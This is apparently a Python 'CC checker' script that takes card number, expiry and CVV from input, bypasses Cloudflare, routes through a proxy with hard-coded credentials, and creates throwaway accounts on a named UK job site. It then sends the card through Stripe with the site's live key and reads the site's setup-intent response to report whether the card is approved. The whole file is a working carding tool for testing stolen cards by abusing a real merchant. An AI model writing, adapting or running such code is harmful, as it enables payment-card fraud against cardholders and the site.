import cloudscraper
import re
import random
import string
import json
import uuid
import time

# Use cloudscraper to bypass Cloudflare
scraper = cloudscraper.create_scraper(browser={'browser': 'chrome', 'platform': 'windows', 'mobile': False})
scraper.headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"}

def g():
    return f"{''.join(random.choices(string.ascii_lowercase + string.digits, k=10))}@{random.choice(['gmail.com', 'yahoo.com'])}"

i = input("CC: ").strip()
try:
    cc, mm, yy, cvv = i.split('|')
    cc = cc.replace(" ", "")
    if len(yy) == 2:
        yy = "20" + yy
except Exception:
    print(json.dumps({"status": "error", "response": "Invalid format"}))
    exit()

# Proxy Setup (Using your working proxy)
PROXY_HOST = "198.105.121.200"
PROXY_PORT = "6462"
PROXY_USER = "nuhqfbby"
PROXY_PASS = "517pqucq7vwv"

try:
    proxy_str = f"http://{PROXY_USER}:{PROXY_PASS}@{PROXY_HOST}:{PROXY_PORT}"
    scraper.proxies = {"http": proxy_str, "https": proxy_str}
    # print(f"🌐 Proxy Enabled: {PROXY_HOST}")
except Exception:
    pass

u = "https://www.ecologyjobs.co.uk/signup/"
# print("🔄 Contacting site...")
r = scraper.get(u, timeout=30)

# Improved Nonce Extraction
m = re.search(r'name="woocommerce-register-nonce"\s+value="([^"]+)"', r.text)
if not m:
    m = re.search(r'"woocommerce-register-nonce":"([^"]+)"', r.text)
if not m:
    m = re.search(r'_wpnonce["\']?\s*[:=]\s*["\']([^"\']+)', r.text)

if not m:
    print(json.dumps({"status": "error", "response": "Nonce not found"}))
    exit()

k = "pk_live_51PGynOHIJjZ53CoY9eYAetODZeX9tyaRMeasCAkcfl39Q1C27FAkZKPz0IbpzXZG8TAiBppG06vU48l87i53frxH00XZ9upWGP"
# print("📝 Registering account...")
r2 = scraper.post(u, data={
    'email': g(),
    'mailchimp_woocommerce_newsletter': '1',
    'reg_role': 'employer,candidate',
    'woocommerce-register-nonce': m[1],
    '_wp_http_referer': '/signup/',
    'register': 'Register'
})

if 'wordpress_logged_in_' not in str(scraper.cookies):
    print(json.dumps({"status": "error", "response": "Registration failed (Check proxy/IP)"}))
    exit()

# print("💳 Tokenizing card with Stripe...")
p = scraper.get(u + "payment-methods/")
n = re.search('"createAndConfirmSetupIntentNonce"\\s*:\\s*"([^"]+)"', p.text)
pm = scraper.post(
    'https://api.stripe.com/v1/payment_methods',
    headers={
        'accept': 'application/json',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'user-agent': scraper.headers['User-Agent']
    },
    data={
        'type': 'card',
        'card[number]': cc,
        'card[cvc]': cvv,
        'card[exp_year]': yy,
        'card[exp_month]': mm,
        'allow_redisplay': 'unspecified',
        'billing_details[address][postal_code]': '10080',
        'billing_details[address][country]': 'US',
        'payment_user_agent': 'stripe.js/c264a67020; stripe-js-v3/c264a67020; payment-element; deferred-intent',
        'referrer': 'https://www.ecologyjobs.co.uk',
        'guid': str(uuid.uuid4()),
        'key': k,
        '_stripe_version': '2024-06-20'
    }
)

if pm.status_code != 200:
    print(json.dumps({"status": "error", "response": f"Stripe Error: {pm.text[:100]}"}))
    exit()

pm_id = pm.json().get('id')
# print(f"🚀 Confirming card {pm_id}...")
r3 = scraper.post(
    'https://www.ecologyjobs.co.uk/wp-admin/admin-ajax.php',
    headers={
        'accept': '*/*',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://www.ecologyjobs.co.uk',
        'referer': u + 'payment-methods/',
        'user-agent': scraper.headers['User-Agent'],
        'x-requested-with': 'XMLHttpRequest'
    },
    data={
        'action': 'wc_stripe_create_and_confirm_setup_intent',
        'wc-stripe-payment-method': pm_id,
        'wc-stripe-payment-type': 'card',
        '_ajax_nonce': n[1] if n else ''
    }
)

status = 'declined'
msg = ''
if r3.status_code == 200:
    try:
        j = r3.json()
        if j.get('success'):
            status, msg = 'approved', 'CARD_ADDED'
        else:
            d = j.get('data', {})
            msg = d.get('error', {}).get('message', 'Card declined') if isinstance(d, dict) else 'Card declined'
    except Exception:
        msg = f"Invalid JSON response: {r3.text[:50]}"
else:
    msg = f"Connection failed (HTTP {r3.status_code})"

print(json.dumps({"status": status, "response": msg}))


##Code For : CC Checker Bot Add Your Own API
